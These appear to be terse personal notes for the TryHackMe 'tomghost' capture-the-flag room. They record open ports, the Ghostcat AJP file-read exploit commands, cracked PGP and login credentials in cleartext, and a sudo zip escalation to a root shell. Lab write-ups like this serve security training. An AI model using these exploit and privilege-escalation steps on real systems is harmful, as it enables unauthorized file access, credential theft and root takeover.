# IP
10.10.169.107

# Ports
8009    AJP
8080    TomCat
53      DNS
22      SSH

# Vulns
2020-1938 - TomGhost

# Exploit 
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
cd Ghostcat-CNVD-2020-10487
python .\ajpShooter.py http://10.10.169.107:8080 8009 WEB-INF/web.xml read

# Credentials
skyfuck:8730281lkjlkjdqlksalks

# Diagonal Privesc 
.\gpg2john.exe D:\CTF\TryHackMe\tomghost\privesc\tryhackme.asc > D:\CTF\TryHackMe\tomghost\privesc\tryhackme_hash

john --wordlist=/mnt/d/Pentest/SecLists/Passwords/Leaked-Databases/rockyou.txt tryhackme_hash

john --show tryhackme_hash

``passphrase: alexandru``

gpg --import tryhackme.asc
gpg --decrypt.pgp

``merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j``

# Horizontal Privesc
sudo -l

``(root : root) NOPASSWD: /usr/bin/zip``

TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF